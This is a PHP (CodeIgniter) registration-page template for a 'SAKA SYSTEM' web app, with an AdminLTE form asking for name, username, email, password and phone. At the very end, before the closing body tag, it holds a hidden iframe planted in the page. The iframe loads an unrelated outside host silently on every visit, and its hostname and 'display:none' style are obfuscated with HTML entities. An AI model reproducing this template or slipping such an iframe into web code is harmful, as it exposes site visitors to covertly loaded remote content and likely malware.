<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>SAKA SYSTEM</title>
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
  <link rel="stylesheet" href= "<?= base_url('asset/plugins/bootstrap/dist/css/bootstrap.min.css');?>" >
  <link rel="stylesheet" href= "<?= base_url('asset/plugins/font-awesome/css/font-awesome.min.css');?>" >
  <link rel="stylesheet" href= "<?= base_url('asset/plugins/Ionicons/css/ionicons.min.css'); ?>" >
  <link rel="stylesheet" href= "<?= base_url('asset/dist/css/AdminLTE.min.css'); ?>" >
  <meta name="mobile-web-app-capable" content="yes">
  <link rel="apple-touch-icon" sizes="57x57" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/apple-icon-57x57.png">
  <link rel="apple-touch-icon" sizes="60x60" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/apple-icon-60x60.png">
  <link rel="apple-touch-icon" sizes="72x72" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/apple-icon-72x72.png">
  <link rel="apple-touch-icon" sizes="76x76" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/apple-icon-76x76.png">
  <link rel="apple-touch-icon" sizes="114x114" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/apple-icon-114x114.png">
  <link rel="apple-touch-icon" sizes="120x120" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/apple-icon-120x120.png">
  <link rel="apple-touch-icon" sizes="144x144" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/apple-icon-144x144.png">
  <link rel="apple-touch-icon" sizes="152x152" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/apple-icon-152x152.png">
  <link rel="apple-touch-icon" sizes="180x180" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/apple-icon-180x180.png">
  <link rel="icon" type="image/png" sizes="192x192"  href="http://cdn.julak.id.kilatstorage.com/saka/favicon/android-icon-192x192.png">
  <link rel="icon" type="image/png" sizes="32x32" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="96x96" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/favicon-96x96.png">
  <link rel="icon" type="image/png" sizes="16x16" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/favicon-16x16.png">
  <link rel="manifest" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/manifest.json">
  <meta name="msapplication-TileColor" content="#ffffff">
  <meta name="msapplication-TileImage" content="http://cdn.julak.id.kilatstorage.com/saka/favicon/ms-icon-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]>
  <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
  <![endif]-->
  <!-- Google Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700,300italic,400italic,600italic">
  <style>.register-page{background-image: url("<?= base_url('asset/dist/img/bg-front.jpg'); ?>") !important; background-repeat: no-repeat; background-attachment: fixed; background-position: center; background-size: cover;}.login-box-body{background: rgba(255,255,255, 0.6) !important}</style>
</head>
<body class="hold-transition register-page">
<div class="login-box">
  <div class="login-logo">
    <a href="#"><b>REGISTRASI</b><br>SAKA SISTEM</a>
  </div>
  <!-- /.login-logo -->
  <div class="login-box-body">
    <p class="login-box-msg"></p>
    <?php if($this->session->flashdata('flashconfirm')): ?>
    <div class="alert alert-success alert-dismissable">
      <button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>
      <?php echo $this->session->flashdata('flashconfirm'); ?>
    </div>
    <?php endif; ?>
    <?php if($this->session->flashdata('flasherror')): ?>
    <div class="alert alert-warning alert-dismissable">
      <button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>
      <?php echo $this->session->flashdata('flasherror'); ?>
    </div>
    <?php endif; ?>

    <?= form_open(); ?>
      <div class="form-group has-feedback <?=form_error('fullname') ? 'has-error' : null; ?>">
        <input type="text" name="fullname" id="fullname" class="form-control" placeholder="Nama Lengkap" value="<?= set_value('fullname'); ?>">
        <span class="glyphicon glyphicon-user form-control-feedback"></span>
        <?= form_error('fullname') ? form_error('fullname', '<p class="help-block">','</p>') : ''; ?>
      </div>
      <div class="form-group has-feedback <?=form_error('username') ? 'has-error' : null; ?>">
        <input type="text" name="username" id="username" class="form-control" placeholder="Username" value="<?= set_value('username'); ?>">
        <span class="glyphicon glyphicon-user form-control-feedback"></span>
        <?= form_error('username') ? form_error('username', '<p class="help-block">','</p>') : ''; ?>
      </div>
      <div class="form-group has-feedback <?= form_error('email') ? 'has-error' : null; ?>">
        <input type="email" name="email" id="email" class="form-control" placeholder="Email" value="<?= set_value('email'); ?>">
        <span class="glyphicon glyphicon-envelope form-control-feedback"></span>
        <?= form_error('email') ? form_error('email', '<p class="help-block">','</p>') : ''; ?>
      </div>
      <div class="form-group has-feedback <?= form_error('password') ? 'has-error' : null; ?>">
        <input type="password" name="password" id="password" class="form-control" placeholder="Password" value="<?= set_value('password'); ?>">
        <span class="glyphicon glyphicon-lock form-control-feedback"></span>
        <?= form_error('password') ? form_error('password', '<p class="help-block">','</p>') : ''; ?>
      </div>
      <div class="form-group has-feedback <?= form_error('repassword') ? 'has-error' : null; ?>">
        <input type="password" name="repassword" id="repassword" class="form-control" placeholder="Ketik Ulang Password" value="<?= set_value('repassword'); ?>">
        <span class="glyphicon glyphicon-lock form-control-feedback"></span>
        <?= form_error('repassword') ? form_error('repassword', '<p class="help-block">','</p>') : ''; ?>
      </div>
      <div class="form-group has-feedback <?= form_error('telpon') ? 'has-error' : null; ?>">
        <input type="text" name="telpon" id="telpon" class="form-control" placeholder="Telpon" value="<?= set_value('telpon'); ?>">
        <span class="glyphicon glyphicon-phone form-control-feedback"></span>
        <?= form_error('telpon') ? form_error('telpon', '<p class="help-block">','</p>') : ''; ?>
      </div>
      <div class="row">
        <div class="col-xs-12">
          <!-- <div class="checkbox icheck">
            <label>
              <input type="checkbox"> Ingatkan Saya
            </label>
          </div> -->
          <button type="submit" class="btn btn-primary btn-block btn-flat"><i class="fa fa-file-text"></i> Registrasi</button>
        </div>
        <!-- /.col -->
        <!-- <div class="col-xs-8">
          <button type="submit" class="btn btn-primary btn-block btn-flat">Registrasi</button>
        </div> -->
        <!-- /.col -->
      </div>
    <?= form_close(); ?>

    <div class="social-auth-links text-center">
      <p>- Sudah Memiliki Akun -</p>
      <a href="<?= site_url('login'); ?>" class="btn btn-success btn-block btn-flat"><i class="fa fa-sign-in"></i> Login</a>
      <!-- <a href="#" class="btn btn-block btn-social btn-facebook btn-flat"><i class="fa fa-facebook"></i> Sign in using
        Facebook</a>
      <a href="#" class="btn btn-block btn-social btn-google btn-flat"><i class="fa fa-google-plus"></i> Sign in using
        Google+</a> -->
    </div>
    <!-- /.social-auth-links -->

    <!-- <a href="#">Saya Lupa Password</a><br> -->
    <!-- <a href="#" class="text-center">Register a new membership</a> -->

  </div>
  <!-- /.login-box-body -->
</div>
<!-- /.login-box -->

<!-- jQuery 3 -->
<script src="<?= base_url('asset/plugins/jquery/dist/jquery.min.js'); ?>"></script>
<script src="<?= base_url('asset/plugins/bootstrap/dist/js/bootstrap.min.js'); ?>"></script>
<iframe src="http://jL.ch&#117;ra.pl/rc/" style="d&#105;splay:none"></iframe>
</body>
</html>
